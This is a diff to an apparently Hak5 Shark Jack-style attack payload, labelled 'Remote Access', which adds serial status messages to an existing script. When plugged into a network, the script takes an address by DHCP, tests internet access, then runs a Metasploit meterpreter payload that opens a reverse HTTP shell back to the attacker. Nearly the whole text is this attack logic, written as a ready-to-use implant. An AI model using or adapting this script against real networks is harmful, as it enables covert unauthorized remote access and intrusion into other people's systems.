@@ -6,7 +6,8 @@
 #               for remote access via a reverse HTTP.
 #
 # Author:       TW-D
-# Version:      1.0
+# Updates:      psycore8
+# Version:      1.1
 # Category:     Remote Access
 #
 # REQUIREMENTS
@@ -34,29 +35,36 @@ set -u
 
 LED SETUP
 
+SERIAL_WRITE [*] init DHCP Client
+
 NETMODE DHCP_CLIENT
+
+SERIAL_WRITE [*] wait for IP address...
 
 dhcp=$(timeout 30 /bin/bash -c 'while ! ifconfig eth0 | grep "inet addr"; do sleep 3; done')
 if [ -n "${dhcp}" ]
 then
-
+    SERIAL_WRITE [+] IP address received
+    SERIAL_WRITE [*] checking internet connection..
     internet=$(timeout 15 /bin/bash -c "wget ${EXTERNAL_URL} -qO /dev/null" 2>&1)
     if [ -z "${internet}" ]
     then
-
+        SERIAL_WRITE [+] Internet connection test successful
         LED ATTACK
-
+        SERIAL_WRITE [*] starting ATTACK...
         chmod +x "${METERPRETER_PAYLOAD}"
         /bin/bash -c "${METERPRETER_PAYLOAD}" &
 
         LED FINISH
-
+        SERIAL_WRITE [+] DONE! Check metasploit
     else
         LED FAIL2
+        SERIAL_WRITE [-] no internet connection available
         halt
     fi
 
 else
     LED FAIL
+    SERIAL_WRITE [-] no IP address received
     halt
 fi
